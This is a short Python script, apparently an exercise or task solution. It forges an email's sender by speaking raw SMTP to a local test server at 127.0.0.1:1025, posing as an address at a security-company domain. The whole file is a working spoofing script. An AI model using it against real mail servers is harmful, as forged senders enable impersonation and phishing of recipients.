#
# We need you to send a spoofed email.
# Use smtp server at '127.0.0.1', port 1025.
# Author needs to be bob-roswell-1947@ship-shape-security.com
# Recipient needs to be zultron@cyberdarkart.com
#

import socket

def sendall(message=None):
  if message: server.sendall(message)
  response = server.recv(1024).decode()
  print(response)
  

from_address = 'bob-roswell-1947@ship-shape-security.com'
to_address = 'zultron@cyberdarkart.com'
smtp_server = '127.0.0.1'
smtp_port = 1025
email_data = (
  f"From: {from_address}\r\n"
  f"To: {to_address}\r\n"
  "Subject: Spoofed Email\r\n"
  "\r\n"
  "This is a spoofed email\r\n"
  ".\r\n"  # End of email
)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect((smtp_server, smtp_port))

sendall()
sendall(b'HELO local\r\n')
sendall(f'MAIL FROM: <{from_address}>\r\n'.encode())
sendall(f'RCPT TO: <{to_address}>\r\n'.encode())
sendall(b'DATA\r\n')

server.sendall(email_data.encode())

sendall(b'\r\n.\r\n')

server.sendall(b'QUIT\r\n')
server.close()
